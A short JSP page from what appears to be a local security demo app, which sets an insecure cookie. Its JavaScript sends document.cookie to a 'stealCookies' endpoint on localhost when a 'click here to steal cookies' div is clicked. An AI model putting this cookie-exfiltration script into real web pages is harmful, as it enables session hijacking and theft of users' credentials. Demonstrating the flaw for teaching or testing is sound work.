<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ page session="true" %>
<%@ include file="/WEB-INF/views/commonPage.jsp" %>
<html>
<head>
	<title>Home</title>
	<script type="text/javascript">
	function test()
	{
		document.location = "http://localhost:8080/painTest/stealCookies?cookie="
				+ document.cookie;
	}
</script>
</head>
<body>

Insecure cookie has been set!<br>
<div onclick="test()">click here to steal cookies</div>

</body>
</html>
